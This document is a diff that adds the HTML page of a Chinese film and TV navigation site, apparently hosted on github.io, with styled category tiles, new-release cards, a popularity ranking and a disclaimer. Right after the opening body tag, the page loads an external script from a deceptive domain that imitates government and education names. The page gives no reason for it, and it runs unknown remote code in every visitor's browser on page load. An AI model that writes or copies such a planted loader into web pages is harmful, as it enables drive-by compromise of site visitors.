@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>凰色影视片 - 东方华美的影视导航 | huangseyingshipian-h5.github.io</title>
+<meta name="description" content="凰色影视片（huangseyingshipian-h5.github.io）以东方凰羽美学整理电影、剧集、动漫与综艺：高清画质标注、屏风式分栏、手机电脑自适应，慢慢挑一片好光影。">
+<meta name="keywords" content="凰色影视片, 高清影视导航, 东方美学, 电影电视剧, 影视索引, huangseyingshipian-h5">
+<meta name="author" content="凰色影视片">
+<meta name="robots" content="index, follow">
+<style>
+  :root{
+    --void:#0c0a0e;
+    --ink:#15121a;
+    --panel:#19151c;
+    --gold:#e8b04b;
+    --gold-d:#a97c2f;
+    --rouge:#d95a5a;
+    --rouge-d:#9c3d45;
+    --moon:#f2e9d8;
+    --celadon:#7cc4b8;
+    --line:1px solid #e8b04b55;
+    --sans:'PingFang SC','Microsoft YaHei',system-ui,sans-serif;
+    --serif:'Songti SC','STSong','SimSun',Georgia,serif;
+    --mono:'SFMono-Regular',Consolas,monospace;
+  }
+  *{margin:0;padding:0;box-sizing:border-box;}
+  html{scroll-behavior:smooth;}
+  body{
+    font-family:var(--sans);background:var(--void);color:var(--moon);
+    line-height:1.7;overflow-x:hidden;position:relative;
+    background-image:
+      radial-gradient(circle at 85% 8%, #e8b04b14 0, transparent 42%),
+      radial-gradient(circle at 12% 88%, #d95a5a12 0, transparent 45%);
+  }
+  /* 云气 */
+  body::before{
+    content:"";position:fixed;inset:-10%;pointer-events:none;z-index:0;opacity:.5;
+    background:
+      radial-gradient(40% 18% at 20% 15%, #e8b04b18 0 30%, transparent 31%),
+      radial-gradient(35% 16% at 75% 30%, #f2e9d810 0 32%, transparent 33%),
+      radial-gradient(30% 14% at 60% 80%, #d95a5a10 0 34%, transparent 35%);
+    filter:blur(14px);animation:cloud 40s linear infinite alternate;
+  }
+  @keyframes cloud{from{transform:translateX(-2%) translateY(1%);}to{transform:translateX(2%) translateY(-1%);}}
+  a{color:var(--celadon);text-decoration:none;transition:.2s;}
+  a:hover{color:var(--gold);}
+  .wrap{max-width:1080px;margin:0 auto;padding:0 1.2rem;position:relative;z-index:2;}
+
+  /* 顶栏 */
+  .topbar{
+    display:flex;align-items:center;justify-content:space-between;
+    padding:1.1rem 1.2rem;position:sticky;top:0;z-index:60;
+    background:linear-gradient(var(--void),transparent);backdrop-filter:blur(8px);
+    border-bottom:var(--line);
+  }
+  .brand{display:flex;align-items:center;gap:.6rem;font-family:var(--serif);
+    font-weight:700;font-size:1.35rem;color:var(--gold);letter-spacing:2px;}
+  .phoenix{width:26px;height:22px;flex:none;}
+  .nav{display:flex;gap:1.3rem;font-family:var(--serif);font-size:.9rem;letter-spacing:1px;}
+  .nav a{color:var(--moon);opacity:.75;}
+  .nav a:hover{opacity:1;color:var(--gold);}
+
+  /* 通用栏目 */
+  section{position:relative;padding:4.5rem 0 3.5rem;border-bottom:var(--line);}
+  .sec-head{display:flex;align-items:center;gap:.8rem;margin-bottom:2rem;}
+  .seal{font-family:var(--serif);font-size:.7rem;color:var(--gold);border:1px solid var(--gold-d);
+    padding:.2rem .55rem;border-radius:3px;letter-spacing:2px;background:#e8b04b0a;}
+  h2.sec-title{font-family:var(--serif);font-size:clamp(1.7rem,4vw,2.6rem);color:var(--moon);
+    letter-spacing:1px;font-weight:600;}
+
+  /* 栏目1：双扇屏风 */
+  #home{padding-top:3rem;}
+  .screen{display:grid;grid-template-columns:1fr 1fr;gap:1rem;margin-bottom:2rem;}
+  .leaf{
+    position:relative;background:linear-gradient(155deg,var(--panel),var(--ink));
+    border:1px solid var(--gold-d);padding:3rem 2rem 2.5rem;
+    clip-path:polygon(0 0,100% 6%,96% 100%,4% 94%);
+    overflow:hidden;min-height:330px;display:flex;flex-direction:column;justify-content:flex-end;
+  }
+  .leaf::before{content:"";position:absolute;inset:8px;border:1px solid #e8b04b33;pointer-events:none;
+    clip-path:polygon(0 0,100% 6%,96% 100%,4% 94%);}
+  .leaf .plume{position:absolute;top:-20px;right:-10px;width:160px;opacity:.9;
+    animation:plume 6s ease-in-out infinite alternate;}
+  @keyframes plume{from{transform:rotate(-3deg) translateY(0);}to{transform:rotate(3deg) translateY(6px);}}
+  .leaf.left .plume{left:-10px;right:auto;transform:scaleX(-1);}
+  .leaf .cloud{position:absolute;top:14%;left:10%;width:70%;height:30%;
+    background:radial-gradient(circle at 30% 50%,#e8b04b22,transparent 60%);filter:blur(8px);}
+  .leaf h1{position:relative;font-family:var(--serif);font-size:clamp(2.2rem,6vw,3.6rem);
+    line-height:1.15;letter-spacing:2px;color:var(--gold);text-shadow:0 2px 20px #e8b04b33;}
+  .leaf h1 em{font-style:normal;color:var(--rouge);}
+  .leaf p.lead{position:relative;margin-top:1rem;color:var(--moon);opacity:.82;font-size:.98rem;}
+  .leaf.right{justify-content:center;}
+  .leaf.right .meta{font-family:var(--mono);font-size:.72rem;color:var(--celadon);letter-spacing:1px;margin-bottom:.6rem;}
+  .tags{display:flex;gap:.5rem;flex-wrap:wrap;margin:1.2rem 0 1.6rem;}
+  .tag{font-family:var(--serif);font-size:.78rem;border:1px solid var(--gold-d);color:var(--gold);
+    padding:.25rem .8rem;background:#e8b04b0a;}
+  .enter{display:inline-block;align-self:flex-start;background:var(--gold);color:var(--void);
+    font-family:var(--serif);font-weight:700;letter-spacing:1px;padding:.7rem 1.9rem;
+    clip-path:polygon(6% 0,100% 0,94% 100%,0 100%);}
+  .enter:hover{background:var(--rouge);color:#fff;}
+
+  /* 栏目2：屏格 */
+  #category .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:1rem;}
+  .lattice{position:relative;background:var(--ink);border:1px solid var(--gold-d);
+    padding:1.3rem 1.1rem;min-height:120px;overflow:hidden;transition:.2s;
+    clip-path:polygon(0 0,100% 0,100% 88%,88% 100%,0 100%);}
+  .lattice::after{content:"";position:absolute;right:0;bottom:0;width:22px;height:22px;
+    background:linear-gradient(135deg,transparent 50%,var(--gold-d) 50%);opacity:.7;}
+  .lattice:hover{background:var(--panel);transform:translateY(-3px);box-shadow:0 8px 24px #e8b04b18;}
+  .lattice .glyph{font-family:var(--serif);font-size:1.5rem;color:var(--rouge);}
+  .lattice h3{font-family:var(--serif);font-size:1.02rem;margin:.4rem 0 .2rem;color:var(--moon);letter-spacing:1px;}
+  .lattice p{font-size:.76rem;opacity:.65;}
+
+  /* 栏目3：片笺 */
+  #latest .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:1.2rem;}
+  .scroll{background:linear-gradient(150deg,#211b22,#15121a);border:1px solid var(--gold-d);
+    border-radius:4px;padding:1.2rem 1.2rem 1rem;position:relative;transition:.2s;}
+  .scroll::before{content:"";position:absolute;top:0;right:0;width:26px;height:26px;
+    background:linear-gradient(135deg,transparent 50%,#15121a 50%,#2a2024 56%,var(--rouge-d) 56%,var(--rouge) 70%,transparent 70%);}
+  .scroll:hover{transform:translateY(-3px);box-shadow:0 10px 26px #e8b04b1a;}
+  .scroll .wash{position:absolute;top:0;left:0;right:0;height:70px;opacity:.35;pointer-events:none;
+    background:radial-gradient(circle at 80% 20%,var(--rouge),transparent 60%);}
+  .scroll .q{font-family:var(--mono);font-size:.62rem;color:var(--void);background:var(--gold);
+    padding:.1rem .5rem;display:inline-block;margin-bottom:.6rem;letter-spacing:1px;}
+  .scroll h3{font-family:var(--serif);font-size:1.08rem;color:var(--moon);letter-spacing:.5px;}
+  .scroll .sub{font-size:.76rem;opacity:.68;margin:.25rem 0 .7rem;}
+  .scroll .foot{display:flex;align-items:center;justify-content:space-between;border-top:1px dashed #e8b04b44;padding-top:.6rem;}
+  .see{font-family:var(--serif);font-size:.82rem;color:var(--celadon);border-bottom:1px solid var(--celadon);}
+
+  /* 栏目4：衔珠榜 */
+  #ranking .list{max-width:760px;}
+  .bead{display:grid;grid-template-columns:52px 1fr auto;gap:1rem;align-items:center;padding:1.1rem 0;
+    border-bottom:var(--line);}
+  .bead-no{font-family:var(--serif);font-size:1.3rem;color:var(--gold);text-align:center;
+    text-shadow:0 0 12px #e8b04b44;}
+  .bead-no.top{color:var(--rouge);}
+  .bead h3{font-family:var(--serif);font-size:1.02rem;letter-spacing:.5px;}
+  .bead .sub{font-size:.74rem;opacity:.65;}
+  .bead .track{height:7px;background:var(--ink);border:1px solid var(--gold-d);margin-top:.45rem;position:relative;}
+  .bead .fill{height:100%;background:linear-gradient(90deg,var(--gold-d),var(--gold),var(--rouge));}
+  .bead .fill::after{content:"";position:absolute;right:0;top:50%;width:9px;height:9px;border-radius:50%;
+    background:var(--rouge);transform:translate(4px,-50%);box-shadow:0 0 8px var(--rouge);}
+  .bead .val{font-family:var(--mono);font-size:.8rem;color:var(--gold);}
+
+  /* 栏目5：说明 */
+  #about .note{background:var(--ink);border:1px solid var(--gold-d);border-left:4px solid var(--rouge);
+    padding:1.7rem;font-size:.92rem;opacity:.85;}
+  #about .note b{color:var(--gold);}
+  .url{font-family:var(--mono);color:var(--celadon);margin-top:.8rem;display:inline-block;}
+
+  footer{text-align:center;font-family:var(--mono);font-size:.78rem;opacity:.6;
+    padding:2.5rem 1rem 3rem;border-top:var(--line);}
+
+  @media(max-width:768px){
+    .nav{display:none;}
+    .screen{grid-template-columns:1fr;}
+    .leaf{min-height:260px;padding:2rem 1.4rem;}
+    .leaf.left .plume,.leaf.right .plume{width:120px;}
+    #category .grid{grid-template-columns:1fr 1fr;}
+    #latest .grid{grid-template-columns:1fr;}
+    .bead{grid-template-columns:42px 1fr;}
+    .bead .val{display:none;}
+  }
+  @media(max-width:420px){
+    #category .grid{grid-template-columns:1fr;}
+  }
+  @media(prefers-reduced-motion:reduce){
+    *{animation:none!important;}
+  }
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="topbar">
+  <div class="brand">
+    <svg class="phoenix" viewBox="0 0 60 52" fill="none" aria-hidden="true">
+      <defs>
+        <linearGradient id="hg" x1="0" y1="0" x2="1" y2="1">
+          <stop offset="0" stop-color="#e8b04b"/><stop offset="1" stop-color="#d95a5a"/>
+        </linearGradient>
+      </defs>
+      <path d="M8,44 C18,34 26,20 30,8 C34,20 42,34 52,44 C44,40 38,36 30,38 C22,36 16,40 8,44Z" fill="url(#hg)" opacity=".9"/>
+      <path d="M30,8 C36,26 46,34 56,36" stroke="#e8b04b" stroke-width="1.6" fill="none"/>
+      <path d="M30,8 C24,26 14,34 4,36" stroke="#d95a5a" stroke-width="1.6" fill="none"/>
+      <circle cx="30" cy="8" r="2.4" fill="#fff6e2"/>
+    </svg>
+    凰色影视片
+  </div>
+  <nav class="nav">
+    <a href="#home">屏风</a>
+    <a href="#category">格目</a>
+    <a href="#latest">片笺</a>
+    <a href="#ranking">衔珠</a>
+    <a href="#about">题跋</a>
+  </nav>
+</header>
+
+<main class="wrap">
+
+  <!-- 栏目1 -->
+  <section id="home">
+    <div class="screen">
+      <div class="leaf left">
+        <svg class="plume" viewBox="0 0 100 120" fill="none" aria-hidden="true">
+          <path d="M10,110 C30,80 55,40 80,18" stroke="#e8b04b" stroke-width="2" fill="none"/>
+          <path d="M80,18 C70,40 78,70 60,100" stroke="#d95a5a" stroke-width="1.4" fill="none"/>
+          <path d="M80,18 C92,38 88,68 74,102" stroke="#7cc4b8" stroke-width="1.2" fill="none"/>
+        </svg>
+        <div class="cloud"></div>
+        <h1>一片<em>凰色</em><br>映入深宵</h1>
+        <p>huangseyingshipian-h5.github.io —— 把电影、剧集、动漫、综艺折成一卷卷片笺，金线描边，慢慢展。</p>
+      </div>
+      <div class="leaf right">
+        <div class="meta">壬寅 · 秋映 · 卷之一</div>
+        <h1 style="font-size:clamp(1.8rem,5vw,2.8rem)">挑片如择羽<br>取其最亮的一根</h1>
+        <div class="tags">
+          <span class="tag">4K 鎏金</span>
+          <span class="tag">1080P 素绢</span>
+          <span class="tag">中字雅音</span>
+          <span class="tag">无喧弹窗</span>
+        </div>
+        <a href="#latest" class="enter">展卷观片 →</a>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目2 -->
+  <section id="category">
+    <div class="sec-head"><span class="seal">格目</span><h2 class="sec-title">十二扇屏格</h2></div>
+    <div class="grid">
+      <div class="lattice"><div class="glyph">戟</div><h3>烽火台</h3><p>动作 / 战争 / 武侠</p></div>
+      <div class="lattice"><div class="glyph">扇</div><h3>长亭剧</h3><p>古装 / 权谋 / 家族史</p></div>
+      <div class="lattice"><div class="glyph">月</div><h3>映月楼</h3><p>爱情 / 青春 / 治愈</p></div>
+      <div class="lattice"><div class="glyph">雾</div><h3>迷雾廊</h3><p>悬疑 / 犯罪 / 烧脑</p></div>
+      <div class="lattice"><div class="glyph">星</div><h3>星汉殿</h3><p>科幻 / 灾变 / 奇幻</p></div>
+      <div class="lattice"><div class="glyph">翎</div><h3>百翎苑</h3><p>动漫 / 国漫 / 番剧</p></div>
+      <div class="lattice"><div class="glyph">盏</div><h3>茶盏会</h3><p>综艺 / 脱口秀 / 访谈</p></div>
+      <div class="lattice"><div class="glyph">卷</div><h3>河山志</h3><p>纪录片 / 人文 / 自然</p></div>
+    </div>
+  </section>
+
+  <!-- 栏目3 -->
+  <section id="latest">
+    <div class="sec-head"><span class="seal">片笺</span><h2 class="sec-title">今日新展</h2></div>
+    <div class="grid">
+      <article class="scroll">
+        <div class="wash"></div><span class="q">4K 鎏金</span>
+        <h3>沙丘3：救世主</h3><div class="sub">科幻 / 156min / 中字雅音</div>
+        <div class="foot"><span class="sub">星汉殿 · 深空卷</span><a href="#" class="see">展卷</a></div>
+      </article>
+      <article class="scroll">
+        <div class="wash"></div><span class="q">合集</span>
+        <h3>庆余年2</h3><div class="sub">古装权谋 / 32集</div>
+        <div class="foot"><span class="sub">长亭剧 · 权谋卷</span><a href="#" class="see">展卷</a></div>
+      </article>
+      <article class="scroll">
+        <div class="wash"></div><span class="q">BD 素绢</span>
+        <h3>周处除三害</h3><div class="sub">动作犯罪 / 134min</div>
+        <div class="foot"><span class="sub">烽火台 · 侠气卷</span><a href="#" class="see">展卷</a></div>
+      </article>
+      <article class="scroll">
+        <div class="wash"></div><span class="q">1080P</span>
+        <h3>飞驰人生2</h3><div class="sub">喜剧 / 118min</div>
+        <div class="foot"><span class="sub">茶盏会 · 笑语卷</span><a href="#" class="see">展卷</a></div>
+      </article>
+      <article class="scroll">
+        <div class="wash"></div><span class="q">4K 鎏金</span>
+        <h3>咒术回战 S3</h3><div class="sub">动漫 / 连载中</div>
+        <div class="foot"><span class="sub">百翎苑 · 热血卷</span><a href="#" class="see">展卷</a></div>
+      </article>
+      <article class="scroll">
+        <div class="wash"></div><span class="q">杜比</span>
+        <h3>花束般的恋爱</h3><div class="sub">爱情 / 124min</div>
+        <div class="foot"><span class="sub">映月楼 · 清欢卷</span><a href="#" class="see">展卷</a></div>
+      </article>
+    </div>
+  </section>
+
+  <!-- 栏目4 -->
+  <section id="ranking">
+    <div class="sec-head"><span class="seal">衔珠</span><h2 class="sec-title">衔珠热度榜</h2></div>
+    <div class="list">
+      <div class="bead">
+        <div class="bead-no top">壹</div>
+        <div><h3>繁花</h3><div class="sub">国产剧 / 王家卫美学</div>
+          <div class="track"><div class="fill" style="width:98%"></div></div></div>
+        <div class="val">9.8</div>
+      </div>
+      <div class="bead">
+        <div class="bead-no top">贰</div>
+        <div><h3>庆余年2</h3><div class="sub">古装权谋</div>
+          <div class="track"><div class="fill" style="width:95%"></div></div></div>
+        <div class="val">9.5</div>
+      </div>
+      <div class="bead">
+        <div class="bead-no top">叁</div>
+        <div><h3>沙丘3</h3><div class="sub">科幻 / 4K 鎏金</div>
+          <div class="track"><div class="fill" style="width:92%"></div></div></div>
+        <div class="val">9.2</div>
+      </div>
+      <div class="bead">
+        <div class="bead-no">肆</div>
+        <div><h3>周处除三害</h3><div class="sub">动作犯罪</div>
+          <div class="track"><div class="fill" style="width:88%"></div></div></div>
+        <div class="val">8.8</div>
+      </div>
+      <div class="bead">
+        <div class="bead-no">伍</div>
+        <div><h3>热辣滚烫</h3><div class="sub">励志喜剧</div>
+          <div class="track"><div class="fill" style="width:84%"></div></div></div>
+        <div class="val">8.4</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目5 -->
+  <section id="about">
+    <div class="sec-head"><span class="seal">题跋</span><h2 class="sec-title">卷末小记</h2></div>
+    <div class="note">
+      <p><b>凰色影视片</b>是一卷影视导航笺，只做分类索引、画质标注与入口整理，<b>不托管视频文件，也不内置播放源</b>。展得慢一点，光影会更久些。</p>
+      <p style="margin-top:.6rem">内容用于个人观影决策与学习交流；实际观看请通过正规授权平台，并遵守当地网络与版权规范。</p>
+      <a href="#" class="url">🌸 https://huangseyingshipian-h5.github.io</a>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  凰色影视片 / huangseyingshipian-h5.github.io<br>
+  © 2026 东方凰羽 · Phoenix Enamel Edition
+</footer>
+
+<script>
+  document.querySelectorAll('a[href^="#"]').forEach(a=>{
+    a.addEventListener('click',e=>{
+      e.preventDefault();
+      const t=document.querySelector(a.getAttribute('href'));
+      if(t)t.scrollIntoView({behavior:'smooth'});
+    });
+  });
+</script>
+</body>
+</html>
